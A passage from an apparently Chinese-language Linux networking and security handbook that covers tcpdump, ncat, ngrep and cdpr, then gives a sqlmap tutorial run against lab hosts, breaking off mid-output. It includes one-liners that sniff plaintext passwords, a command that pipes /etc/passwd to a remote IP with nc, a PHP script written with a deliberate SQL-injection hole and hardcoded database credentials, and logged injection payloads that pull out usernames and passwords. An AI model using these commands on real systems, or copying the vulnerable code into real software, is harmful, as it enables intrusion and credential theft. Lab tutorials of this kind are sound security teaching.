	0x0010:  b869 ce55 a704 0019 c34d 0683 bf09 42f6  .i.U.....M....B.
	0x0020:  8018 0073 5503 0000 0101 080a 5d79 76ab  ...sU.......]yv.
	0x0030:  acd8 19b6 4d41 494c 2046 524f 4d3a 3c6e  ....MAIL.FROM:<n
	0x0040:  6f72 6570 6c79 4063 6631 3339 2e63 6f6d  oreply@139.com
	0x0050:  3e0d 0a00 0000 0000 0000 0000 0000 0000  >...............
	0x0060:  0000 00                                  ...
05:55:43.142280 IP 184.105.206.85.25 > 59.153.146.101.42756: Flags [.], ack 32, win 16022, options [nop,nop,TS val 2899843513 ecr 1568241323], length 0
	0x0000:  4500 0034 c774 4000 3b06 2392 b869 ce55  E..4.t@.;.#..i.U
	0x0010:  3b99 9265 0019 a704 bf09 42f6 c34d 06a2  ;..e......B..M..
	0x0020:  8010 3e96 d5a5 0000 0101 080a acd8 19b9  ..>.............
	0x0030:  5d79 76ab 0000 0000 0000 0000 0000 0000  ]yv.............
	0x0040:  0000 0000                                ....
05:55:43.270436 IP 203.205.160.43.25 > 202.88.38.95.39594: Flags [.], ack 1271517256, win 159, options [nop,nop,TS val 1663885325 ecr 1568241310], length 0
	0x0000:  4500 0034 18e5 4000 3806 cd2e cbcd a02b  E..4..@.8......+
	0x0010:  ca58 265f 0019 9aaa 800c c423 4bc9 d048  .X&_.......#K..H
	0x0020:  8010 009f 0716 0000 0101 080a 632c e00d  ............c,..
	0x0030:  5d79 769e 0000 0000 0000 0000 0000 0000  ]yv.............
	0x0040:  0000 0000                                ....

```

嗅探用户密码

```

# tcpdump -i any port http or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|userna me:|password:|login:|pass |user '

# tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20

```

```

# tcpdump -A -q -i any port 25 | grep "RCPT TO:"
# tcpdump -l -s0 -w - tcp dst port 25 | strings | grep -i 'MAIL FROM\|RCPT TO'			

```

## 3. cdpr - Cisco Discovery Protocol Reporter

```
$ sudo apt-get install cdpr

```

```
$ sudo cdpr
[sudo] password for neo:
cdpr - Cisco Discovery Protocol Reporter
Version 2.4
Copyright (c) 2002-2010 - MonkeyMental.com

1\. eth0 (No description available)
2\. tun0 (No description available)
3\. usbmon1 (USB bus number 1)
4\. usbmon2 (USB bus number 2)
5\. usbmon3 (USB bus number 3)
6\. usbmon4 (USB bus number 4)
7\. usbmon5 (USB bus number 5)
8\. lo (No description available)
Enter the interface number (1-8):1
Using Device: eth0
Waiting for CDP advertisement:
(default config is to transmit CDP packets every 60 seconds)
Device ID
  value:  4A3750G
Addresses
  value:  193.168.0.254
Port ID
  value:  GigabitEthernet1/0/15

```

通过 cdprs.php 收集 CDP 数据，很容易改写，实现写入数据库

/usr/share/doc/cdpr/examples/

```
$ find /usr/share/doc/cdpr/examples/
/usr/share/doc/cdpr/examples/
/usr/share/doc/cdpr/examples/cdprs
/usr/share/doc/cdpr/examples/cdprs/cdprs.cgi.gz
/usr/share/doc/cdpr/examples/cdprs/cdprs.php
/usr/share/doc/cdpr/examples/cdpr.conf

```

这个功能可以实现后自动绘制网络拓扑，分析收集的数据，然后通过 Graphviz 绘制网络拓扑图。

## 4. ncat - Concatenate and redirect sockets

### nc - TCP/IP swiss army knife

按照 ncat

```
# yum search nc | grep nmap
nmap-ncat.x86_64 : Nmap's Netcat replacement

yum install nmap-ncat

```

### 4.1. TCP 数据传输

Server

```
nc -l 8080 > test.txt

```

Client

```
cat /etc/hosts | nc your_server 8080

```

### 4.2. UDP 数据传输

Server 端

```
nc -4 -u -l 9000

```

Client 端

```
cat /etc/passwd | nc -4 -u 47.90.1.240 9000

```

### 4.3. 始终保持服务器开启

-k, --keep-open Accept multiple connections in listen mode

```
# nc -l 8087 -k

```

这是你可以持续想服务器端发送数据

### 4.4. 传输视频流

服务端，这里我们从一个视频文件中读入并重定向输出到 netcat 客户端

```
$cat video.avi | nc -l 3000

```

客户端，从 socket 中读入数据并通过管道传递给 mplayer 播放该视频。

```
$nc 172.16.0.10 3000 | mplayer -vo x11 -cache 3000 -			

```

## 5. ngrep - Network layer grep tool

安装

```
yum install -y ngrep		

```

帮助信息

```

# ngrep -help
usage: ngrep <-hNXViwqpevxlDtTRM> <-IO pcap_dump> <-n num> <-d dev> <-A num>
             <-s snaplen> <-S limitlen> <-W normal|byline|single|none> <-c cols>
             <-P char> <-F file> <match expression> <bpf filter>
   -h  is help/usage
   -V  is version information
   -q  is be quiet (don't print packet reception hash marks)
   -e  is show empty packets
   -i  is ignore case
   -v  is invert match
   -R  is don't do privilege revocation logic
   -x  is print in alternate hexdump format
   -X  is interpret match expression as hexadecimal
   -w  is word-regex (expression must match as a word)
   -p  is don't go into promiscuous mode
   -l  is make stdout line buffered
   -D  is replay pcap_dumps with their recorded time intervals
   -t  is print timestamp every time a packet is matched
   -T  is print delta timestamp every time a packet is matched
         specify twice for delta from first match
   -M  is don't do multi-line match (do single-line match instead)
   -I  is read packet stream from pcap format file pcap_dump
   -O  is dump matched packets in pcap format to pcap_dump
   -n  is look at only num packets
   -A  is dump num packets after a match
   -s  is set the bpf caplen
   -S  is set the limitlen on matched packets
   -W  is set the dump format (normal, byline, single, none)
   -c  is force the column width to the specified size
   -P  is set the non-printable display char to what is specified
   -F  is read the bpf filter from the specified file
   -N  is show sub protocol number
   -d  is use specified device instead of the pcap default

```

### 5.1. 匹配关键字

#### -q is be quiet (don't print packet reception hash marks)

```
# ngrep -q GET -d eth1 port 80
# ngrep -q POST -d eth1 port 80
# ngrep -q /news/111.html -d eth1 port 80
# ngrep -q User-Agent -d eth1 port 80
# ngrep -q Safari -d eth1 port 80

```

```
# ngrep -q HELO -d enp2s0 port 25mp
interface: enp2s0 (173.254.223.0/255.255.255.192)
filter: ( port 25 ) and (ip or ip6)
match: HELO

T 47.90.44.87:39023 -> 173.254.223.53:25 [AP]
  HELO localhost..                                                                                                                                                                                                                       

T 47.90.44.87:39024 -> 173.254.223.53:25 [AP]
  HELO localhost..                                                                                                                                                                                                                       

T 47.90.44.87:39025 -> 173.254.223.53:25 [AP]
  HELO localhost..

```

### 5.2. 指定网络接口

-d is use specified device instead of the pcap default

```
# ngrep -d eth0
# ngrep -d enp2s0

```

## 6. Unicornscan，Zenmap，nast

## 7. netstat-nat - Show the natted connections on a linux iptable firewall

```
neo@monitor:~$ sudo netstat-nat
Proto NATed Address                  Destination Address            State
tcp   10.8.0.14:1355                 172.16.1.25:ssh                ESTABLISHED
tcp   10.8.0.14:1345                 172.16.1.63:ssh                ESTABLISHED
tcp   10.8.0.14:1340                 172.16.1.46:ssh                ESTABLISHED
tcp   10.8.0.14:1346                 172.16.1.25:ssh                ESTABLISHED
tcp   10.8.0.14:1344                 172.16.1.62:ssh                ESTABLISHED
tcp   10.8.0.14:1343                 172.16.1.48:ssh                ESTABLISHED

```

你也同时可以使用下面命令查看

```
$ cat /proc/net/ip_conntrack
$ cat /proc/net/nf_conntrack

```

## 8. Tcpreplay

http://tcpreplay.synfin.net/

## 9. Wireshark

Wireshark is a network protocol analyzer for Unix and Windows.

http://www.wireshark.org/

## 第 144 章 sqlmap - automatic SQL injection and database takeover tool

http://sqlmap.sourceforge.net/

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

## 1. Installation

```
$ apt-cache search sqlmap
sqlmap - automatic SQL injection tool

$ sudo apt-get install sqlmap

$ dpkg -s sqlmap

```

安装开发板

```
sudo svn checkout https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap-dev

sudo vim ~/.bashrc

#行尾加上：
alias sqlmap='python /home/neo/sqlmap-dev/sqlmap.py'

该环境变量只对当前用户有效

如果想对所有用户有效 可设置全局 文件/etc/profile

```

sqlmap 参数

```

$ sqlmap-dev/sqlmap.py -h

    sqlmap/1.0-dev (r4577) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:05:44

Usage: python sqlmap-dev/sqlmap.py [options]

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be specified to set the source to
    get target urls from.

    -d DIRECT           Direct connection to the database
    -u URL, --url=URL   Target url
    -l LOGFILE          Parse targets from Burp or WebScarab proxy logs
    -m BULKFILE         Scan multiple targets enlisted in a given textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target urls
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target url.

    --data=DATA         Data string to be sent through POST
    --param-del=PDEL    Character used for splitting parameter values
    --cookie=COOKIE     HTTP Cookie header
    --cookie-urlencode  URL Encode generated cookie injections
    --drop-set-cookie   Ignore Set-Cookie header from response
    --user-agent=AGENT  HTTP User-Agent header
    --random-agent      Use randomly selected HTTP User-Agent header
    --randomize=RPARAM  Randomly change value for given parameter(s)
    --referer=REFERER   HTTP Referer header
    --headers=HEADERS   Extra HTTP headers newline separated
    --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
    --auth-cred=ACRED   HTTP authentication credentials (name:password)
    --auth-cert=ACERT   HTTP authentication certificate (key_file,cert_file)
    --proxy=PROXY       Use a HTTP proxy to connect to the target url
    --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
    --ignore-proxy      Ignore system default HTTP proxy
    --delay=DELAY       Delay in seconds between each HTTP request
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retries=RETRIES   Retries when the connection timeouts (default 3)
    --scope=SCOPE       Regexp to filter targets from provided proxy log
    --safe-url=SAFURL   Url address to visit frequently during testing
    --safe-freq=SAFREQ  Test requests between two visits to a given safe url
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

  Optimization:
    These options can be used to optimize the performance of sqlmap.

    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts.

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to this value
    --os=OS             Force back-end DBMS operating system to this value
    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
    --logic-negative    Use logic operation(s) instead of negating values
    --skip=SKIP         Skip testing for given parameter(s)
    --tamper=TAMPER     Use given script(s) for tampering injection data

  Detection:
    These options can be used to specify how to parse and compare page
    content from HTTP responses when using blind SQL injection technique.

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (0-3, default 1)
    --string=STRING     String to match in the response when query is valid
    --regexp=REGEXP     Regexp to match in the response when query is valid
    --code=CODE         HTTP response code to match when the query is valid
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques.

    --technique=TECH    SQL injection techniques to test for (default "BEUST")
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    --union-char=UCHAR  Character to use for bruteforcing number of columns

  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements.

    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table to enumerate
    -C COL              DBMS database table column to enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --start=LIMITSTART  First query output entry to retrieve
    --stop=LIMITSTOP    Last query output entry to retrieve
    --first=FIRSTCHAR   First query output word character to retrieve
    --last=LASTCHAR     Last query output word character to retrieve
    --sql-query=QUERY   SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell

  Brute force:
    These options can be used to run brute force checks.

    --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns

  User-defined function injection:
    These options can be used to create custom user-defined functions.

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library

  File system access:
    These options can be used to access the back-end database management
    system underlying file system.

    --file-read=RFILE   Read a file from the back-end DBMS file system
    --file-write=WFILE  Write a local file on the back-end DBMS file system
    --file-dest=DFILE   Back-end DBMS absolute filepath to write to

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system.

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process' user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

  Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry.

    --reg-read          Read a Windows registry key value
    --reg-add           Write a Windows registry key value data
    --reg-del           Delete a Windows registry key value
    --reg-key=REGKEY    Windows registry key
    --reg-value=REGVAL  Windows registry key value
    --reg-data=REGDATA  Windows registry key value data
    --reg-type=REGTYPE  Windows registry key value type

  General:
    These options can be used to set some general working parameters.

    -s SESSIONFILE      Save and resume all data retrieved on a session file
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
    --batch             Never ask for user input, use the default behaviour
    --charset=CHARSET   Force character encoding used for data retrieval
    --check-tor         Check to see if Tor is used properly
    --crawl=CRAWLDEPTH  Crawl the website starting from the target url
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    --eta               Display for each output the estimated time of arrival
    --flush-session     Flush session file for current target
    --forms             Parse and test forms on target url
    --fresh-queries     Ignores query results stored in session file
    --parse-errors      Parse and display DBMS error messages from responses
    --replicate         Replicate dumped data into a sqlite3 database
    --save              Save options on a configuration INI file
    --tor               Use default Tor SOCKS5 proxy address
    --update            Update sqlmap

  Miscellaneous:
    -z MNEMONICS        Use mnemonics for shorter parameter setup
    --beep              Alert when sql injection found
    --check-payload     Offline WAF/IPS/IDS payload detection testing
    --check-waf         Check for existence of WAF/IPS/IDS protection
    --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
    --dependencies      Check for missing sqlmap dependencies
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    --mobile            Imitate smartphone through HTTP User-Agent header
    --page-rank         Display page rank (PR) for Google dork results
    --smart             Conduct through tests only if positive heuristic(s)
    --wizard            Simple wizard interface for beginner users

[*] shutting down at 18:05:44

```

## 2. 开始入住实验

当你运行 sqlmap 的时候，我建议你运行下面命令监控你的 web 服务器日志

```
 tail -f access.log

```

### 2.1. 测试脚本

```

<?php
    $mysql_server_name="172.16.0.4";
    $mysql_username="dbuser";
    $mysql_password="dbpass";
    $mysql_database="dbname";

    $conn=mysql_connect($mysql_server_name, $mysql_username,
                        $mysql_password);
	$strsql="";
	if($_GET['id']){
		$strsql="select * from `order` where id=".$_GET['id'];
	}else{
	    $strsql="select * from `order` limit 100";
	}
	echo $strsql;
    $result=@mysql_db_query($mysql_database, $strsql, $conn);

    $row=mysql_fetch_row($result);

    echo '<font face="verdana">';
    echo '<table border="1" cellpadding="1" cellspacing="2">';

    echo "\n<tr>\n";
    for ($i=0; $i<mysql_num_fields($result); $i++)
    {
      echo '<td bgcolor="#000F00"><b>'.
      mysql_field_name($result, $i);
      echo "</b></td>\n";
    }
    echo "</tr>\n";

    mysql_data_seek($result, 0);

    while ($row=mysql_fetch_row($result))
    {
      echo "<tr>\n";
      for ($i=0; $i<mysql_num_fields($result); $i++ )
      {
        echo '<td bgcolor="#00FF00">';
        echo "$row[$i]";
        echo '</td>';
      }
      echo "</tr>\n";
    }

    echo "</table>\n";
    echo "</font>";

    mysql_free_result($result);

    mysql_close();

```

### 2.2. sqlmap.ini

```
vim ~/.sqlmap/sqlmap.ini

[Target]
googledork =
list =
url = http://172.16.0.44/test/testdb.php?id=12

[Request]
acred =
atype =
agent =
cookie =
data =
delay = 0
headers =
method = GET
proxy =
referer = http://www.google.com
threads = 1
timeout = 10
useragentsfile =

[Miscellaneous]
batch = False
eta = False
sessionfile =
updateall = False
verbose = 1

[Enumeration]
col =
db =
dumpall = False
dumptable = False
excludesysdbs = False
getbanner = False
getcolumns = False
getcurrentdb = False
getcurrentuser = False
getdbs = False
getpasswordhashes = False
getprivileges = False
gettables = False
getusers = False
isdba = False
limitstart = 0
limitstop = 0
query =
sqlshell = False
tbl =
user =

[File system]
rfile =
wfile =

[Takeover]
osshell = False

[Fingerprint]
extensivefp = False

[Injection]
dbms =
eregexp =
estring =
postfix =
prefix =
regexp =
string =
testparameter =

[Techniques]
stackedtest = False
timetest = False
utech =
uniontest = False
unionuse = False

```

## 3. Request 参数

### 3.1. --method, --data

```

sqlmap -u "http://www.example.com/login.php" --method "POST" --data "user=neo&passwd=chen"

```

### 3.2. --cookie

### 3.3. --referer

```
$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --referer="http://www.google.com"

```

access.log 输出

```
113.106.63.1 - - [10/Dec/2011:16:52:41 +0800] "GET /test/testdb.php?id=12%29%20AND%20%288621=8621 HTTP/1.1" 200 978 "http://www.google.com" "sqlmap/0.6.4 (http://sqlmap.sourceforge.net)"
113.106.63.1 - - [10/Dec/2011:16:52:41 +0800] "GET /test/testdb.php?id=12%29%29%20AND%20%28%282589=2589 HTTP/1.1" 200 980 "http://www.google.com" "sqlmap/0.6.4 (http://sqlmap.sourceforge.net)"

```

### 3.4. --user-agent

默认是 "sqlmap/0.6.4 (http://sqlmap.sourceforge.net)"

检查 Your User Agent: http://whatsmyuseragent.com/

Chrome

```
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2

```

IE9

```
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)

```

Safari

```
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7

```

首先开启日志监控

```
tail -f /www/logs/access.log

```

伪装成 Safari

```
$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --user-agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7"

```

access.log 输出结果

```
113.106.63.1 - - [10/Dec/2011:16:48:24 +0800] "GET /test/testdb.php?id=12%20AND%20ORD%28MID%28%28SELECT%200%20FROM%20information_schema.TABLES%20LIMIT%200%2C%201%29%2C%202%2C%201%29%29%20%3E%203%20AND%201184=1184 HTTP/1.1" 200 2191 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7"
113.106.63.1 - - [10/Dec/2011:16:48:24 +0800] "GET /test/testdb.php?id=12%20AND%20ORD%28MID%28%28SELECT%200%20FROM%20information_schema.TABLES%20LIMIT%200%2C%201%29%2C%202%2C%201%29%29%20%3E%201%20AND%201184=1184 HTTP/1.1" 200 2191 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7"

```

#### 3.4.1. -a

### 3.5. --headers

### 3.6. --referer

### 3.7. auth

#### 3.7.1. --auth-type

#### 3.7.2. --auth-cred

### 3.8. --proxy

### 3.9. --threads

### 3.10. --delay

### 3.11. --timeout

## 4. Injection

### 4.1. --dbms

```
neo@neo-OptiPlex-380:~$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --dbms "mysql"

[*] starting at: 17:39:43

[17:39:43] [INFO] testing connection to the target url
[17:39:43] [INFO] testing if the url is stable, wait a few seconds
[17:39:44] [INFO] url is stable
[17:39:44] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
[17:39:44] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
[17:39:44] [INFO] testing if GET parameter 'id' is dynamic
[17:39:44] [INFO] confirming that GET parameter 'id' is dynamic
[17:39:44] [INFO] GET parameter 'id' is dynamic
[17:39:44] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
[17:39:44] [INFO] testing unescaped numeric injection on GET parameter 'id'
[17:39:44] [INFO] confirming unescaped numeric injection on GET parameter 'id'
[17:39:44] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
[17:39:44] [INFO] testing for parenthesis on injectable parameter
[17:39:44] [INFO] the injectable parameter requires 0 parenthesis
[17:39:44] [INFO] testing MySQL
[17:39:44] [INFO] confirming MySQL
[17:39:44] [INFO] query: SELECT 2 FROM information_schema.TABLES LIMIT 0, 1
[17:39:44] [INFO] retrieved: 2
[17:39:45] [INFO] performed 13 queries in 0 seconds
[17:39:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0

[*] shutting down at: 17:39:45

```

### 4.2. --prefix

### 4.3. --postfix

### 4.4. --string

### 4.5. --regexp

### 4.6. --excl-str

### 4.7. --excl-reg

## 5. Techniques

### 5.1. --stacked-test

### 5.2. --time-test

### 5.3. --union-test

```
$ sqlmap -u "http://172.16.0.44/team.php?id=3429" --union-test

```

### 5.4. --union-tech

### 5.5. --union-use

## 6. Enumeration

### 6.1. dbs

```
$ sqlmap -u "http://172.16.0.44/test/testdb.php?id=12" --dbs

```

```
[*] starting at: 15:59:20

[15:59:20] [INFO] testing connection to the target url
[15:59:20] [INFO] testing if the url is stable, wait a few seconds
[15:59:22] [INFO] url is stable
[15:59:22] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
[15:59:22] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
[15:59:22] [INFO] testing if GET parameter 'id' is dynamic
[15:59:22] [INFO] confirming that GET parameter 'id' is dynamic
[15:59:22] [INFO] GET parameter 'id' is dynamic
[15:59:22] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
[15:59:22] [INFO] testing unescaped numeric injection on GET parameter 'id'
[15:59:22] [INFO] confirming unescaped numeric injection on GET parameter 'id'
[15:59:22] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
[15:59:22] [INFO] testing for parenthesis on injectable parameter
[15:59:22] [INFO] the injectable parameter requires 0 parenthesis
[15:59:22] [INFO] testing MySQL
[15:59:22] [INFO] confirming MySQL
[15:59:22] [INFO] query: SELECT 2 FROM information_schema.TABLES LIMIT 0, 1
[15:59:22] [INFO] retrieved: 2
[15:59:22] [INFO] performed 13 queries in 0 seconds
[15:59:22] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0

[15:59:22] [INFO] fetching database names
[15:59:22] [INFO] fetching number of databases
[15:59:22] [INFO] query: SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA
[15:59:22] [INFO] retrieved: 3
[15:59:23] [INFO] performed 13 queries in 0 seconds
[15:59:23] [INFO] query: SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR(10000)), CHAR(32))) FROM information_schema.SCHEMATA LIMIT 0, 1
[15:59:23] [INFO] retrieved: information_schema
[15:59:27] [INFO] performed 132 queries in 4 seconds
[15:59:27] [INFO] query: SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR(10000)), CHAR(32))) FROM information_schema.SCHEMATA LIMIT 1, 1
[15:59:27] [INFO] retrieved: groupgoods
[15:59:29] [INFO] performed 76 queries in 2 seconds
[15:59:29] [INFO] query: SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR(10000)), CHAR(32))) FROM information_schema.SCHEMATA LIMIT 2, 1
[15:59:29] [INFO] retrieved: test
[15:59:30] [INFO] performed 34 queries in 1 seconds
available databases [3]:
[*] groupgoods
[*] information_schema
[*] test

[15:59:30] [INFO] Fetched data logged to text files under '/home/neo/.sqlmap/output/172.16.0.44'

[*] shutting down at: 15:59:30

```

### 6.2. --count

```

$ sqlmap -u "http://localhost/test.php?id=98" --count

    sqlmap/1.0-dev (r4843) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 14:36:50

[14:36:51] [INFO] using '/home/neo/sqlmap-dev/output/localhost/session' as session file
[14:36:51] [INFO] resuming back-end DBMS 'mysql 5.0.11' from session file
[14:36:51] [INFO] testing connection to the target url
[14:36:51] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=98 AND 4108=4108

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: id=98 UNION ALL SELECT CONCAT(0x3a6b79703a,0x57596b57416f63567046,0x3a6c757a3a), NULL, NULL#

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: id=98 AND SLEEP(5)
---

[14:36:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.3.6
back-end DBMS: MySQL 5.0.11
[14:36:51] [WARNING] missing table parameter, sqlmap will retrieve the number of entries for all database management system databases' tables
[14:36:51] [INFO] fetching database names
[14:36:51] [INFO] fetching tables for databases: information_schema, mysql, neo, performance_schema, test
[14:36:52] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[14:36:52] [INFO] retrieved: 
[14:36:52] [INFO] retrieved: 
[14:36:52] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:53] [INFO] retrieved: 
[14:36:54] [INFO] retrieved: 
[14:36:54] [INFO] retrieved: 
[14:36:54] [INFO] retrieved: 
[14:36:54] [INFO] retrieved: 
[14:36:54] [INFO] retrieved: 
[14:36:54] [INFO] retrieved: 
Database: neo
+---------------------------------------+---------+
| Table                                 | Entries |
+---------------------------------------+---------+
| test                                  | 43      |
| stuff                                 | 4       |
| users                                 | 3       |
+---------------------------------------+---------+

Database: information_schema
+---------------------------------------+---------+
| Table                                 | Entries |
+---------------------------------------+---------+
| COLUMNS                               | 667     |
| GLOBAL_STATUS                         | 291     |
| SESSION_STATUS                        | 291     |
| GLOBAL_VARIABLES                      | 276     |
| SESSION_VARIABLES                     | 276     |
| USER_PRIVILEGES                       | 138     |
| COLLATION_CHARACTER_SET_APPLICABILITY | 128     |
| COLLATIONS                            | 127     |
| PARTITIONS                            | 90      |
| TABLES                                | 80      |
| STATISTICS                            | 78      |
| KEY_COLUMN_USAGE                      | 64      |
| CHARACTER_SETS                        | 36      |
| SCHEMA_PRIVILEGES                     | 36      |
| TABLE_CONSTRAINTS                     | 35      |
| PLUGINS                               | 10      |
| ENGINES                               | 8       |
| SCHEMATA                              | 5       |
| PROCESSLIST                           | 1       |
+---------------------------------------+---------+

Database: mysql
+---------------------------------------+---------+
| Table                                 | Entries |
+---------------------------------------+---------+
| help_relation                         | 1028    |
| help_topic                            | 508     |
| help_keyword                          | 465     |
| help_category                         | 38      |
| user                                  | 8       |
| db                                    | 3       |
| proxies_priv                          | 2       |
+---------------------------------------+---------+

[14:36:57] [INFO] Fetched data logged to text files under '/home/neo/sqlmap-dev/output/localhost'

[*] shutting down at 14:36:57

```

### 6.3. --dump/--dump-all

```

$ sqlmap -u "http://localhost/test.php?id=98" --dump-all --flush-session			

```

### 6.4. --sql-query

```
$ sqlmap -u "http://localhost/test.php?id=98" --sql-query="SELECT username, password FROM test"

    sqlmap/1.0-dev (r4843) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 15:46:57

[15:46:58] [INFO] using '/home/neo/sqlmap-dev/output/localhost/session' as session file
[15:46:58] [INFO] resuming back-end DBMS 'mysql 5.0.11' from session file
[15:46:58] [INFO] testing connection to the target url
[15:46:58] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: boolean-based blind
